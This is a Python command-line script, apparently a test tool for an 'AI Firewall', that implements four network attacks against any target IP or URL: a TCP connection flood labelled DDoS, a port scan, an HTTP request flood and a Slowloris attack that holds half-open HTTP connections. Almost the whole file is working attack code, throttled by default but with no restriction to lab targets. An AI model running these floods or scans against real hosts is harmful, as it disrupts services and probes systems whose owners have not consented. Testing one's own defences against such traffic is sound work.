import time
import random
import threading
import socket
import sys
import os
import requests
from datetime import datetime

class AttackSimulator:
    def __init__(self):
        self.is_attacking = False
        self.attack_thread = None
    
    def ddos_attack(self, target_ip, target_port=80, duration=10, packet_count=100):
        """Simulate a DDoS attack"""
        self.is_attacking = True
        end_time = time.time() + duration
        
        print(f"🚀 Starting DDoS attack on {target_ip}:{target_port}")
        print(f"⏰ Duration: {duration} seconds")
        print(f"📦 Packets: {packet_count} packets")
        print("Press Ctrl+C to stop the attack\n")
        
        packets_sent = 0
        
        try:
            while time.time() < end_time and self.is_attacking:
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    
                    # Try to connect (this will create traffic)
                    result = s.connect_ex((target_ip, target_port))
                    
                    if result == 0:
                        # Send some data if connection successful
                        s.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
                    
                    s.close()
                    packets_sent += 1
                    
                    if packets_sent % 10 == 0:
                        print(f"📤 Sent {packets_sent} packets to {target_ip}")
                    
                    time.sleep(0.1)  # Short delay
                    
                except Exception as e:
                    print(f"❌ Error: {e}")
                    time.sleep(1)
        
        except KeyboardInterrupt:
            print("\n⏹️  Attack stopped by user")
        
        finally:
            self.is_attacking = False
            print(f"\n✅ Attack completed. Total packets sent: {packets_sent}")
    
    def port_scan(self, target_ip, start_port=1, end_port=100, delay=0.1):
        """Simulate a port scan attack"""
        self.is_attacking = True
        open_ports = []
        
        print(f"🔍 Scanning ports {start_port}-{end_port} on {target_ip}")
        print("Press Ctrl+C to stop the scan\n")
        
        try:
            for port in range(start_port, end_port + 1):
                if not self.is_attacking:
                    break
                
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    result = s.connect_ex((target_ip, port))
                    s.close()
                    
                    if result == 0:
                        print(f"✅ Port {port} is OPEN")
                        open_ports.append(port)
                    else:
                        print(f"❌ Port {port} is CLOSED")
                    
                    time.sleep(delay)
                    
                except Exception as e:
                    print(f"⚠️  Error scanning port {port}: {e}")
                
        except KeyboardInterrupt:
            print("\n⏹️  Scan stopped by user")
        
        finally:
            self.is_attacking = False
            print(f"\n📊 Scan completed. Open ports: {open_ports}")
    
    def http_flood(self, target_url, duration=10):
        """Simulate HTTP flood attack"""
        self.is_attacking = True
        end_time = time.time() + duration
        requests_sent = 0
        
        print(f"🌊 Starting HTTP flood attack on {target_url}")
        print(f"⏰ Duration: {duration} seconds")
        print("Press Ctrl+C to stop the attack\n")
        
        try:
            while time.time() < end_time and self.is_attacking:
                try:
                    response = requests.get(target_url, timeout=2)
                    requests_sent += 1
                    print(f"📨 Request #{requests_sent} - Status: {response.status_code}")
                    
                except requests.exceptions.RequestException as e:
                    print(f"❌ Request failed: {e}")
                    requests_sent += 1
                
                time.sleep(0.5)
        
        except KeyboardInterrupt:
            print("\n⏹️  Attack stopped by user")
        
        finally:
            self.is_attacking = False
            print(f"\n✅ HTTP flood completed. Total requests: {requests_sent}")
    
    def slowloris_attack(self, target_ip, target_port=80, duration=30):
        """Simulate Slowloris attack"""
        self.is_attacking = True
        end_time = time.time() + duration
        sockets = []
        
        print(f"🐌 Starting Slowloris attack on {target_ip}:{target_port}")
        print(f"⏰ Duration: {duration} seconds")
        print("Press Ctrl+C to stop the attack\n")
        
        try:
            while time.time() < end_time and self.is_attacking:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target_ip, target_port))
                    s.send(b"GET / HTTP/1.1\r\n")
                    s.send(b"Host: " + target_ip.encode() + b"\r\n")
                    sockets.append(s)
                    print(f"📊 Connected sockets: {len(sockets)}")
                    
                except Exception as e:
                    print(f"❌ Connection failed: {e}")
                
                time.sleep(1)
        
        except KeyboardInterrupt:
            print("\n⏹️  Attack stopped by user")
        
        finally:
            # Clean up sockets
            for s in sockets:
                try:
                    s.close()
                except:
                    pass
            self.is_attacking = False
            print(f"\n✅ Slowloris attack completed. Max connections: {len(sockets)}")
    
    def stop_attack(self):
        """Stop any ongoing attack"""
        self.is_attacking = False
        print("🛑 Stopping attack...")

def print_usage():
    """Print usage instructions"""
    print("""
🚀 AI Firewall Attack Simulator
Usage: python attack_simulator.py <attack_type> <target> [options]

Attack Types:
  ddos       <target_ip> [port] [duration] [packets]
  portscan   <target_ip> [start_port] [end_port] [delay]
  httpflood  <target_url> [duration]
  slowloris  <target_ip> [port] [duration]

Examples:
  python attack_simulator.py ddos 192.168.1.1
  python attack_simulator.py ddos 192.168.1.1 80 30 200
  python attack_simulator.py portscan 192.168.1.1 1 1000 0.2
  python attack_simulator.py httpflood http://example.com 20
  python attack_simulator.py slowloris 192.168.1.1 80 60
""")

def main():
    simulator = AttackSimulator()
    
    if len(sys.argv) < 3:
        print_usage()
        sys.exit(1)
    
    attack_type = sys.argv[1].lower()
    target = sys.argv[2]
    
    try:
        if attack_type == "ddos":
            port = int(sys.argv[3]) if len(sys.argv) > 3 else 80
            duration = int(sys.argv[4]) if len(sys.argv) > 4 else 10
            packets = int(sys.argv[5]) if len(sys.argv) > 5 else 100
            simulator.ddos_attack(target, port, duration, packets)
            
        elif attack_type == "portscan":
            start_port = int(sys.argv[3]) if len(sys.argv) > 3 else 1
            end_port = int(sys.argv[4]) if len(sys.argv) > 4 else 100
            delay = float(sys.argv[5]) if len(sys.argv) > 5 else 0.1
            simulator.port_scan(target, start_port, end_port, delay)
            
        elif attack_type == "httpflood":
            duration = int(sys.argv[3]) if len(sys.argv) > 3 else 10
            simulator.http_flood(target, duration)
            
        elif attack_type == "slowloris":
            port = int(sys.argv[3]) if len(sys.argv) > 3 else 80
            duration = int(sys.argv[4]) if len(sys.argv) > 4 else 30
            simulator.slowloris_attack(target, port, duration)
            
        else:
            print(f"❌ Unknown attack type: {attack_type}")
            print_usage()
            
    except KeyboardInterrupt:
        print("\n⏹️  Attack stopped by user")
    except Exception as e:
        print(f"❌ Error: {e}")
        print_usage()
    finally:
        simulator.stop_attack()

if __name__ == '__main__':
    main()